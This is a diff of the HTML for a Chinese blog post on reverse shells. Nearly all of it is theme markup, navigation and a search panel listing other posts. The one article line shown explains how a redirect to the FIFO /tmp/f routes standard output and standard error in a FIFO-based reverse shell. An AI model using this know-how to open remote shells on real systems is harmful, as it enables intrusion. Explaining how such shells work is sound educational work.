+<li>当解析到<strong>&rdquo;&gt; /tmp/f&rdquo;</strong>的时候进程会把标准输出&rdquo;1&rdquo;定向到FIFO文件&rdquo;/tmp/f&rdquo;，而此时标准错误“2”还是指向前一步中定向的“终端”，因此造成了执行的问题。</li>
 </ol>
-        </div>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://www.singleye.net/tags/reverseshell/">ReverseShell</a>
 
-    </article>
+  <a class="tag tag--primary tag--small" href="https://www.singleye.net/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
 
-    
-    
-
-    
+                  </div>
+                
+              
+            
+            
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://www.singleye.net/2019/09/ssh%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/" data-tooltip="ssh代理方法">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://www.singleye.net/2017/08/%E7%94%A8scrapy%E7%88%AC%E5%8F%96%E4%BA%AC%E4%B8%9C%E5%95%86%E5%93%81%E4%BF%A1%E6%81%AF/" data-tooltip="用scrapy爬取京东商品信息">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
         
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
         
-    
-
-    
-
-    
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
         
-    <div id="disqus_thread"></div>
-<script>
-    window.disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "singleye" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
 
 
-
-
-
-
-
-
-
-
-
-    
-
-    
-
-    
-
-        </main>
-        
-            <footer class="common-footer noselect">
-    
-    
-
-    <div class="common-footer-bottom">
-        
-
-        <div style="display: flex; align-items: center; gap:8px">
-            © singleye, 2024
             
-        </div>
-        <div style="display:flex;align-items: center">
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
             
-            
-            
-            
-            
-            
-        </div>
-        <div>
-            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/Junyi-99/hugo-theme-anubis2">Anubis2</a>.<br>
-            
-
-        </div>
-    </div>
-
-    <p class="h-card vcard">
-
-    <a href=https://www.singleye.net/ class="p-name u-url url fn" rel="me"></a>
-
-    
-
-    
-</p>
-
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2024 singleye. All Rights Reserved
+  </span>
 </footer>
 
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
         
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://www.singleye.net/2019/09/ssh%E4%BB%A3%E7%90%86%E6%96%B9%E6%B3%95/" data-tooltip="ssh代理方法">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://www.singleye.net/2017/08/%E7%94%A8scrapy%E7%88%AC%E5%8F%96%E4%BA%AC%E4%B8%9C%E5%95%86%E5%93%81%E4%BF%A1%E6%81%AF/" data-tooltip="用scrapy爬取京东商品信息">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#table-of-contents">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
     </div>
-</body>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/images/avatar.png" alt="作者的图片" />
+    
+    <h4 id="about-card-name">singleye</h4>
+    
+      <div id="about-card-bio"><strong>Email:</strong> <a href="mailto:singleye512@gmail.com">singleye512@gmail.com</a></div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Product &amp; Engineering
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Shanghai, China
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="搜索" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center"></div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2024/06/%E5%9F%BA%E4%BA%8E-kalman-filter-%E7%9A%84%E7%9B%AE%E6%A0%87%E8%B7%9F%E8%B8%AA/">
+                <h3 class="media-heading">基于 Kalman filter 的目标跟踪</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jun 6, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><!--toc-->
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2024/04/%E5%9C%A8-apple-silicon-m3-max-%E4%B8%8A%E5%AF%B9-llama2-%E8%BF%9B%E8%A1%8C%E5%BE%AE%E8%B0%83/">
+                <h3 class="media-heading">在 Apple silicon (M3 Max) 上对 Llama2 进行微调</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Apr 4, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><!--toc-->
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2024/04/tmux-ai-%E5%8A%A9%E6%89%8B/">
+                <h3 class="media-heading">tmux AI 助手</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Apr 4, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">日产开发时很喜欢用 tmux，最近写了一个 tmux 的 AI 插件，这个插件可以使用 ollama 支持的 LLM 生成 shell / 编程相关的内容，会对日常使用 CLI 的同学们带来一些帮助。
+使用方法：  + Q 调出命令输入栏，在输入栏中写好问题回车，之后 tmux 会把生成的答案在新的窗口中显示出来。
+项目链接： https://github.com/singleye/tmux-ai-helper</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2024/03/%E4%BD%BF%E7%94%A8-roswaitforshutdown-%E5%AF%BC%E8%87%B4-dynamic_reconfigureserver-%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E8%8E%B7%E5%8F%96%E9%85%8D%E7%BD%AE%E6%9B%B4%E6%96%B0%E7%9A%84%E9%97%AE%E9%A2%98/">
+                <h3 class="media-heading">使用 ros::waitForShutdown() 导致 dynamic_reconfigure::Server 无法正常获取配置更新的问题</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2024
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><!--toc-->
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2023/12/pcl-3d-%E7%A9%BA%E9%97%B4%E6%A3%80%E6%B5%8B%E5%B9%B3%E8%A1%8C%E5%9B%9B%E8%BE%B9%E5%BD%A2/">
+                <h3 class="media-heading">PCL 3D 空间检测平行四边形</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><!--toc-->
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2023/12/javascript-var/let/const-%E6%AF%94%E8%BE%83/">
+                <h3 class="media-heading">javascript var/let/const 比较</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><!--toc-->
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2023/12/django-rest-framework-%E5%92%8C-simplejwt-%E7%9A%84%E7%B1%BB%E5%85%B3%E7%B3%BB/">
+                <h3 class="media-heading">django-rest-framework 和 simplejwt 的类关系</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2023/11/python-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">
+                <h3 class="media-heading">Python 内存管理</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Nov 11, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2023/10/%E5%B7%A6%E4%B9%98/%E5%8F%B3%E4%B9%98%E6%97%8B%E8%BD%AC/">
+                <h3 class="media-heading">左乘/右乘旋转</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://www.singleye.net/2023/08/%E5%A4%9A%E5%AA%92%E4%BD%93%E6%A0%BC%E5%BC%8F%E6%A0%87%E5%87%86h264-%E7%BC%96%E7%A0%81%E4%B8%8E-mp4-%E6%A0%BC%E5%BC%8F%E7%AE%80%E8%A6%81%E4%BB%8B%E7%BB%8D/">
+                <h3 class="media-heading">多媒体格式标准、H264 编码与 MP4 格式简要介绍</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Aug 8, 2023
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero=""
+         data-message-one=""
+         data-message-other="">
+         79 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/images/cover.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://www.singleye.net/js/script-id5yjczimn7hvkl7hmhqf7f2rihleozgxiext4jwyj7u507rwphg9wvfbks4.min.js"></script>
+
+
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/www.singleye.net\/2018\/04\/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell\/';
+          
+            this.page.identifier = '\/2018\/04\/%E8%AF%B4%E4%B8%80%E8%AF%B4%E5%8F%8D%E5%BC%B9shell\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'singleye';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
 </html>
+
